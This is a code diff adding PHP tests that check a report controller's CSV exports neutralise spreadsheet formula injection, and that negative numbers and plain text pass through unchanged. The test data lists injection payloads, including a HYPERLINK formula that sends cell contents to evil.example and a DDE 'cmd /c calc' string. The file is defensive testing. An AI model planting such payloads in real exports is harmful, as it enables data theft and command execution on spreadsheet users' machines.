@@ -4,6 +4,7 @@ declare(strict_types=1);
 
 namespace Tests\Feature\Reports;
 
+use App\Http\Controllers\ReportController;
 use App\Models\BreedingRecord;
 use App\Models\Broodcock;
 use App\Models\HealthRecord;
@@ -254,5 +255,98 @@ final class ReportExportTest extends TestCase
             ->assertOk()
             ->assertSee('Elena Reyes')
             ->assertSee('CSV');
+    }
+
+    // -----------------------------------------------------------------
+    // CSV formula injection
+    //
+    // Every free-text field in this system reaches an export, and a
+    // spreadsheet executes a cell that begins with = + - or @. The payload is
+    // stored perfectly safely and does its damage in Excel, which is why this
+    // has to be handled where the file is written rather than where the text
+    // is displayed.
+    // -----------------------------------------------------------------
+
+    /**
+     * @return array<string, array{0: string}>
+     */
+    public static function formulaPayloads(): array
+    {
+        return [
+            'equals' => ['=1+1'],
+            'plus' => ['+1+1'],
+            'at sign' => ['@SUM(A1)'],
+            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.example/?"&A1,"Open")'],
+            'minus with a payload' => ['-2+3+cmd|\' /c calc\'!A0'],
+            'leading tab hides the equals' => ["\t=1+1"],
+            'leading space hides the equals' => [' =1+1'],
+        ];
+    }
+
+    #[DataProvider('formulaPayloads')]
+    public function test_a_formula_typed_into_a_bird_name_is_neutralised_in_the_csv(string $payload): void
+    {
+        Broodcock::factory()->create(['name' => $payload, 'band_number' => 'GF-0001']);
+
+        $body = $this->actingAs(User::factory()->owner()->create())
+            ->get(route('reports.csv', 'broodcock_inventory'))
+            ->streamedContent();
+
+        // Parsed, not substring-matched: fputcsv doubles every quote inside a
+        // field, so the raw bytes of a payload containing quotes never appear
+        // in the file verbatim. What matters is the value a spreadsheet DECODES
+        // the cell to, which is what str_getcsv reproduces.
+        $name = $this->csvCell($body, 'Name');
+
+        // Prefixed with an apostrophe, which a spreadsheet reads as "the rest
+        // of this is literal text" and does not display.
+        $this->assertSame("'".$payload, $name);
+
+        // And the text is still all there - neutralising must not silently
+        // discard a record keeper's data, only stop it being executed.
+        $this->assertStringContainsString($payload, $name);
+    }
+
+    /** The value of one column in the first data row of a CSV export. */
+    private function csvCell(string $body, string $column): string
+    {
+        $lines = preg_split('/\R/', trim(ltrim($body, "\xEF\xBB\xBF")));
+
+        $headers = str_getcsv((string) $lines[0]);
+        $row = str_getcsv((string) $lines[1]);
+
+        $index = array_search($column, $headers, true);
+        $this->assertNotFalse($index, "No [{$column}] column in the export.");
+
+        return (string) $row[$index];
+    }
+
+    /**
+     * Negative numbers are the reason this is not a blanket prefix.
+     *
+     * Quoting them would turn every negative figure on every report into text,
+     * breaking sorting and SUM() on the columns the report exists for. A value
+     * that is genuinely numeric cannot carry a payload.
+     */
+    public function test_a_negative_number_is_not_quoted(): void
+    {
+        $this->assertSame('-12.5', $this->neutralize('-12.5'));
+        $this->assertSame('-3', $this->neutralize('-3'));
+        $this->assertSame('0', $this->neutralize('0'));
+    }
+
+    public function test_ordinary_text_is_untouched(): void
+    {
+        $this->assertSame('Bruno', $this->neutralize('Bruno'));
+        $this->assertSame('Died of heat stress', $this->neutralize('Died of heat stress'));
+        $this->assertSame('', $this->neutralize(null));
+    }
+
+    /** Reaches the controller's private helper, which has no other seam. */
+    private function neutralize(string|int|float|null $value): string|int|float
+    {
+        $method = new \ReflectionMethod(ReportController::class, 'neutralizeFormula');
+
+        return $method->invoke(null, $value);
     }
 }
